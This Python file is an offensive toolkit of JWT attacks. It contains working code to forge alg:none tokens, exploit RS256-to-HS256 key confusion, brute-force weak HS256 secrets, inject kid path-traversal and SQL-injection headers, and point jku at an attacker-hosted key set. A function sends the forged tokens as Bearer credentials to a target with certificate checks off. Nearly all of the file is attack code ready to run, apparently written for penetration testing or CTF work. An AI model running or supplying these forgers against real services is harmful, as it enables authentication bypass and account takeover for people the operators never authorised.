#!/usr/bin/env python3
"""JWT attacks: unverified decode, alg:none, RS256->HS256 algorithm confusion,
weak-secret brute force, and kid / jku header injection.

Note: this file is intentionally NOT named jwt.py, because that would shadow
the PyJWT library (import jwt) when the script is run directly."""

import base64
import hashlib
import hmac
import json
import jwt  # PyJWT
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def decode_without_verify(token: str) -> dict:
    """Read header + payload without checking the signature. First thing to do:
    inspect alg, kid, jku and claims like role / is_admin / exp."""
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    print("Header :", json.dumps(header, indent=2))
    print("Payload:", json.dumps(payload, indent=2))
    return {"header": header, "payload": payload}


def manual_decode(token: str) -> dict:
    """Decode header and payload by hand (no library), in case PyJWT rejects a
    malformed or attacker-crafted token."""
    header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(_b64url_decode(header_b64))
    payload = json.loads(_b64url_decode(payload_b64))
    return {"header": header, "payload": payload}


def forge_alg_none(payload: dict) -> str:
    """alg:none attack. Build an unsigned token by hand so it works regardless
    of the PyJWT version (recent versions guard against encoding 'none')."""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def alg_confusion_rs256_to_hs256(public_key_pem: str, payload: dict) -> str:
    """RS256->HS256 confusion. If the server verifies RS256 but trusts the alg
    header, re-sign the token as HS256 using the server's RSA *public* key as
    the HMAC secret. Signed manually because PyJWT refuses a PEM string as an
    HMAC key. The exact bytes matter: try with and without a trailing newline
    on the PEM."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url(sig)}"


def bruteforce_hs256_secret(token: str, wordlist_path: str) -> str | None:
    """Brute force a weak HS256 signing secret against a wordlist (e.g. rockyou)."""
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            try:
                jwt.decode(token, candidate, algorithms=["HS256"])
                print(f"[+] Secret found: {candidate}")
                return candidate
            except (jwt.InvalidSignatureError, jwt.DecodeError):
                continue
    print("[-] Secret not found in the wordlist")
    return None


def forge_token_with_known_secret(secret: str, payload: dict, algorithm: str = "HS256") -> str:
    """Mint an arbitrary token once the signing secret is known."""
    return jwt.encode(payload, secret, algorithm=algorithm)


def forge_with_kid_path_traversal(payload: dict, known_file_content: bytes = b"") -> str:
    """kid path-traversal: point kid at a file whose contents you can predict
    (e.g. an empty/static file) and sign with those bytes as the HMAC key."""
    headers = {"kid": "../../../../dev/null"}
    return jwt.encode(payload, key=known_file_content, algorithm="HS256", headers=headers)


def forge_with_kid_sqli(payload: dict, injected_secret: str = "attacker_controlled_secret") -> str:
    """kid SQL injection: if kid is used in a DB lookup for the key, inject a
    UNION that returns a value you control, then sign with that value."""
    headers = {"kid": f"nonexistent' UNION SELECT '{injected_secret}'-- -"}
    return jwt.encode(payload, key=injected_secret, algorithm="HS256", headers=headers)


def forge_with_jku(payload: dict, attacker_jwks_url: str, private_key_pem: str) -> str:
    """jku injection: set jku to a JWKS URL you host, serving a public key whose
    matching private key signs this token (RS256)."""
    headers = {"jku": attacker_jwks_url}
    return jwt.encode(payload, key=private_key_pem, algorithm="RS256", headers=headers)


def send_forged_token(token: str, endpoint: str = "/api/me"):
    """Send a forged token as a Bearer credential and show the response."""
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}{endpoint}", headers=headers, verify=False, timeout=10)
    print(r.status_code, r.text[:300])
    return r


if __name__ == "__main__":
    pass
